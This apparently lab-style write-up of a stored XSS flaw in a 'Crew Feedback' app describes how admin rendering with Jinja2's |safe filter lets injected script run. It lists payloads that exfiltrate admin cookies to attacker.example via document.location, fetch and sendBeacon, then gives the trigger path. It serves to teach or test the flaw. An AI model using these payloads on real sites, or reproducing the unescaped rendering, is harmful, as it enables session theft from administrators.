Crew Feedback — Stored XSS

CWE-79 · User input rendered with |safe in admin view · Persistent script injection
Feedback is stored in the DB and rendered in the admin panel with the Jinja2 |safe filter — bypassing auto-escaping. An attacker submitting <script>document.location='https://attacker.example/?c='+document.cookie</script> executes it in every admin browser that views the feedback list.
Payloads:
  • <script>alert('XSS-'+document.domain)</script>
  • <img src=x onerror="fetch('https://attacker.example/'+btoa(document.cookie))">
  • <svg onload="navigator.sendBeacon('https://attacker.example',document.cookie)">
Then visit /admin/feedback to trigger stored XSS.
